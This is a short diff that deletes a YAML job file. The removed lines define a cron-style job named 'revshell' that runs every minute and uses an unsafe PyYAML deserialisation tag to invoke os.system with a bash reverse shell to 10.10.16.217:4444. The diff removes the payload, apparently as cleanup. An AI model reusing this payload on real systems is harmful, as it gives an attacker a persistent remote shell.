@@ -1,5 +1,1 @@
-name: revshell
-schedule: "* * * * *"
-runtime: python3.11
-command: !!python/object/apply:os.system
-  args: ["bash -c 'bash -i >& /dev/tcp/10.10.16.217/4444 0>&1'"]
+
